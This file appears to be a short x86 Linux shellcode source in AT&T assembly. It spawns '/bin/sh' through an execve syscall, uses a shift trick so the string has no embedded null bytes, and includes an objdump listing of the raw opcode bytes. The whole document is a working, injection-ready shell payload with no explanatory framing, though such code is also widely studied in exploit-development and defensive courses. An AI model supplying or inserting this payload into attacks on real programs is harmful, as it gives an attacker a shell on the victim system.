.section .text
	.globl main
main:
	xorl %eax, %eax
	add $0xb, %eax         # sys_execve
	mov $0xff68732f, %ebx  # "/sh\xff" in ebx
	shl $8, %ebx           # "/bin/sh" in ebx lacks final \x00
	shr $8, %ebx           # "/bin/sh" in ebx with final \x00
	pushl %ebx             # push "/sh\x00"
	pushl $0x6e69622f      # push "/bin"
	movl %esp, %ebx        # argv[0]
	xorl %ecx, %ecx        # command line parameters
	xorl %edx, %edx        # environment block
	int  $0x80

exit:
	movl $0x1, %eax
	xorl %ebx, %ebx
	int $0x80

/*
080483f0 <main>:
 80483f0:	31 c0                	xor    %eax,%eax
 80483f2:	83 c0 0b             	add    $0xb,%eax
 80483f5:	bb 2f 73 68 ff       	mov    $0xff68732f,%ebx
 80483fa:	c1 e3 08             	shl    $0x8,%ebx
 80483fd:	c1 eb 08             	shr    $0x8,%ebx
 8048400:	53                   	push   %ebx
 8048401:	68 2f 62 69 6e       	push   $0x6e69622f
 8048406:	89 e3                	mov    %esp,%ebx
 8048408:	31 c9                	xor    %ecx,%ecx
 804840a:	31 d2                	xor    %edx,%edx
 804840c:	cd 80                	int    $0x80
*/
